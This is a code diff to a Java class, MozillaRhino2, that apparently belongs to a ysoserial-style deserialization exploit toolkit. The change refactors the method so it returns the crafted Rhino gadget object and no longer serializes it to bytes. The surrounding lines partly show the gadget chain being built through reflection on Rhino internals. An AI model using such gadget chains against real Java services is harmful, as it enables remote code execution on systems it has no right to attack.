@@ -44,7 +44,7 @@ import java.util.Map;
  */
 public class MozillaRhino2 implements ObjectPayload<Object>{
     @Override
-    public byte[] getBytes(PayloadType type, String... param) throws Exception {
+    public Object getObject(PayloadType type, String... param) throws Exception {
         ScriptableObject    dummyScope       = new Environment();
         Map<Object, Object> associatedValues = new Hashtable<Object, Object>();
         associatedValues.put("ClassCache", Reflections.createWithoutConstructor(ClassCache.class));
@@ -85,18 +85,6 @@ public class MozillaRhino2 implements ObjectPayload<Object>{
         Reflections.setFieldValue(nativeJavaObject, "adapter_writeAdapterObject",
                 this.getClass().getMethod("customWriteAdapterObject", Object.class, ObjectOutputStream.class));
         Reflections.setFieldValue(nativeJavaObject, "javaObject", nativeJavaArray);
-
-        ByteArrayOutputStream baous = new ByteArrayOutputStream();
-        ObjectOutputStream    oos   = new ObjectOutputStream(baous);
-        oos.writeObject(nativeJavaObject);
-        byte[] bytes = baous.toByteArray();
-        oos.close();
-
-        return bytes;
-    }
-
-    @Override
-    public Object getObject(String command) throws Exception {
-        return null;
+        return nativeJavaObject;
     }
 }
